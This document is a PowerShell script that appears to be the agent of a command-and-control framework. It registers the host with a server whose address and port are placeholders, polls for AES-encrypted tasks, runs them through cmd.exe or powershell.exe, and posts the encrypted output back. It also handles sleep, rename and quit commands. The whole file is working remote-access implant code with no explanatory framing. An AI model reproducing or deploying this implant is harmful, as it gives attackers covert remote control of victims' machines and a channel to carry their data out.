function Create-AesManagedObject($key, $IV) {
    
    $aesManaged           = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode      = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding   = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize   = 256
    
    if ($IV) {
        
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        
        else {
            $aesManaged.IV = $IV
        }
    }
    
    if ($key) {
        
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        
        else {
            $aesManaged.Key = $key
        }
    }
    
    $aesManaged
}

function Encrypt($key, $unencryptedString) {
    
    $bytes             = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged        = Create-AesManagedObject $key
    $encryptor         = $aesManaged.CreateEncryptor()
    $encryptedData     = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt($key, $encryptedStringWithIV) {
    
    $bytes           = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV              = $bytes[0..15]
    $aesManaged      = Create-AesManagedObject $key $IV
    $decryptor       = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)

}

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    $p.WaitForExit()
    
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    $res = "VALID $stdout`n$stderr"
    $res
}

$ip   = "REPLACE_IP"
$port = "REPLACE_PORT"
$key  = "REPLACE_KEY"
$n    = 3
$name = ""

$hname = [System.Net.Dns]::GetHostName()
$type  = "p"
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg")
$data  = @{
    name = "$hname" 
    type = "$type"
    }
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content

$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")

for (;;){
    
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        $task = Decrypt $key $task
        $task = $task.split()
        $flag = $task[0]
        
        if ($flag -eq "VALID"){
            
            $command = $task[1]
            $args    = $task[2..$task.Length]

            if ($command -eq "shell"){
            
                $f    = "cmd.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt $key $res
                $data = @{result = "$res"}
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

            }
            elseif ($command -eq "powershell"){
            
                $f    = "powershell.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt $key $res
                $data = @{result = "$res"}
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

            }
            elseif ($command -eq "sleep"){

                $n    = [int]$args[0]
                $data = @{result = ""}
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
            elseif ($command -eq "rename"){
                
                $name    = $args[0]
                $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
                $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
            
                $data    = @{result = ""}
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
            elseif ($command -eq "quit"){
                exit
            }
        }

    sleep $n
    }
}